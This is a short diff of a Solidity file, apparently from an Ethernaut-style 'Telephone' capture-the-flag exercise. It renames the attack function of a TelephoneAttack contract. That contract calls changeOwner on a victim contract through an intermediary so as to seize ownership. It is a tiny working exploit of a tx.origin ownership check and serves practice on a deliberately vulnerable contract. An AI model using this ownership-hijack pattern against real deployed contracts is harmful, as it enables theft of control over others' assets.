@@ -19,9 +19,8 @@ contract Telephone {
 
 contract TelephoneAttack{
     Telephone tel;
-
-
-    function attack(address _victim) public{
+    
+    function NoThisIsPatrick(address _victim) public{
          tel = Telephone(_victim);
          tel.changeOwner(msg.sender);
     }
